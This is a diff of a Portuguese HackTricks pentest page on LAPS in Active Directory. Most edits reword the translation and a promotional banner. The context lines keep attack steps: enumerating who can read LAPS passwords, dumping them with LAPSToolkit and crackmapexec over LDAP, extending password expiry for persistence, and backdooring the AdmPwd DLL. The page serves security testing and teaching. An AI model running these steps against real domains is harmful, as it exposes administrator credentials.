@@ -2,23 +2,23 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 ## Informações Básicas
 
-Local Administrator Password Solution (LAPS) é uma ferramenta usada para gerenciar um sistema onde as **senhas de administrador**, que são **únicas, aleatórias e alteradas com frequência**, são aplicadas a computadores associados a um domínio. Essas senhas são armazenadas de forma segura dentro do Active Directory e só são acessíveis a usuários que tenham permissão por meio de Listas de Controle de Acesso (ACLs). A segurança das transmissões de senha do cliente para o servidor é garantida pelo uso do **Kerberos versão 5** e do **Padrão de Criptografia Avançada (AES)**.
+Local Administrator Password Solution (LAPS) é uma ferramenta usada para gerenciar um sistema onde as **senhas de administrador**, que são **únicas, aleatórias e alteradas com frequência**, são aplicadas a computadores associados a um domínio. Essas senhas são armazenadas de forma segura dentro do Active Directory e só são acessíveis a usuários que tenham permissão concedida por meio de Listas de Controle de Acesso (ACLs). A segurança das transmissões de senha do cliente para o servidor é garantida pelo uso do **Kerberos versão 5** e do **Padrão de Criptografia Avançada (AES)**.
 
 Nos objetos de computador do domínio, a implementação do LAPS resulta na adição de dois novos atributos: **`ms-mcs-AdmPwd`** e **`ms-mcs-AdmPwdExpirationTime`**. Esses atributos armazenam a **senha de administrador em texto simples** e **seu tempo de expiração**, respectivamente.
 
-### Verificar se está ativado
+### Verificar se ativado
 ```bash
 reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
 
@@ -66,7 +66,7 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 ```
 ### LAPSToolkit
 
-O [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita a enumeração do LAPS com várias funções. Um deles é analisar **`ExtendedRights`** para **todos os computadores com o LAPS ativado**. Isso mostrará **grupos** especificamente **delegados para ler senhas do LAPS**, que muitas vezes são usuários em grupos protegidos. Uma **conta** que tenha **associado um computador** a um domínio recebe `Todos os Direitos Estendidos` sobre esse host, e esse direito dá à **conta** a capacidade de **ler senhas**. A enumeração pode mostrar uma conta de usuário que pode ler a senha do LAPS em um host. Isso pode nos ajudar a **direcionar usuários específicos do AD** que podem ler senhas do LAPS.
+O [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita a enumeração do LAPS com várias funções. Um desses é analisar **`ExtendedRights`** para **todos os computadores com o LAPS ativado**. Isso mostrará **grupos** especificamente **delegados para ler senhas do LAPS**, que frequentemente são usuários em grupos protegidos. Uma **conta** que tenha **associado um computador** a um domínio recebe `Todos os Direitos Estendidos` sobre esse host, e esse direito dá à **conta** a capacidade de **ler senhas**. A enumeração pode mostrar uma conta de usuário que pode ler a senha do LAPS em um host. Isso pode nos ajudar a **direcionar usuários específicos do AD** que podem ler senhas do LAPS.
 ```powershell
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -90,7 +90,7 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## **Despejando Senhas LAPS com Crackmapexec**
+## **Extraindo Senhas do LAPS com o Crackmapexec**
 Se não houver acesso ao powershell, você pode abusar desse privilégio remotamente através do LDAP usando
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
@@ -109,7 +109,7 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 {% hint style="warning" %}
-A senha ainda será redefinida se um **admin** usar o cmdlet **`Reset-AdmPwdPassword`**; ou se **Não permitir tempo de expiração de senha mais longo do que o exigido pela política** estiver habilitado na GPO do LAPS.
+A senha ainda será redefinida se um **administrador** usar o cmdlet **`Reset-AdmPwdPassword`**; ou se **Não permitir que o tempo de expiração da senha seja maior do que o exigido pela política** estiver habilitado na GPO do LAPS.
 {% endhint %}
 
 ### Backdoor
@@ -120,3 +120,15 @@ Então, basta compilar o novo `AdmPwd.PS.dll` e fazer o upload para a máquina e
 
 ## Referências
 * [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
+
+<details>
+
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+
+</details>
